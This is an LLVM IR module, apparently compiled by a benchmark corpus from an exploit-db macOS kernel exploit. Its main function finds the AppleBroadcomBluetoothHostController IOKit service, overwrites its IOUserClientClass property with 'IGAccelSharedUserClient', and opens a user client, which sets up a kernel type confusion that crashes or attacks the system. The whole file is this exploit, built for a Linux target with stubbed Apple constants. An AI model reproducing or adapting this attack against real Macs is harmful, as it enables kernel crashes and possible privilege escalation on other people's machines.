; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_40952.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_40952.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"AppleBroadcomBluetoothHostController\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"got service: %x\0A\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"IOUserClientClass\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"IGAccelSharedUserClient\00", align 1
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [20 x i8] c"setProperty failed\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"set the property!!\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"got userclient connection: %x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @kIOMasterPortDefault, align 4
  %6 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %7 = call i64 @IOServiceGetMatchingService(i32 %5, i32 %6)
  store i64 %7, i64* %2, align 8
  %8 = load i64, i64* %2, align 8
  %9 = load i64, i64* @IO_OBJECT_NULL, align 8
  %10 = icmp eq i64 %8, %9
  br i1 %10, label %11, label %13

11:                                               ; preds = %0
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %40

13:                                               ; preds = %0
  %14 = load i64, i64* %2, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i64 %14)
  %16 = load i64, i64* %2, align 8
  %17 = call i32 @CFSTR(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0))
  %18 = call i32 @CFSTR(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %19 = call i64 @IORegistryEntrySetCFProperty(i64 %16, i32 %17, i32 %18)
  store i64 %19, i64* %3, align 8
  %20 = load i64, i64* %3, align 8
  %21 = load i64, i64* @KERN_SUCCESS, align 8
  %22 = icmp ne i64 %20, %21
  br i1 %22, label %23, label %25

23:                                               ; preds = %13
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  br label %27

25:                                               ; preds = %13
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  br label %27

27:                                               ; preds = %25, %23
  %28 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %28, i32* %4, align 4
  %29 = load i64, i64* %2, align 8
  %30 = call i32 (...) @mach_task_self()
  %31 = call i64 @IOServiceOpen(i64 %29, i32 %30, i32 0, i32* %4)
  store i64 %31, i64* %3, align 8
  %32 = load i64, i64* %3, align 8
  %33 = load i64, i64* @KERN_SUCCESS, align 8
  %34 = icmp ne i64 %32, %33
  br i1 %34, label %35, label %37

35:                                               ; preds = %27
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.7, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %40

37:                                               ; preds = %27
  %38 = load i32, i32* %4, align 4
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i32 %38)
  store i32 0, i32* %1, align 4
  br label %40

40:                                               ; preds = %37, %35, %11
  %41 = load i32, i32* %1, align 4
  ret i32 %41
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IORegistryEntrySetCFProperty(i64, i32, i32) #1

declare dso_local i32 @CFSTR(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
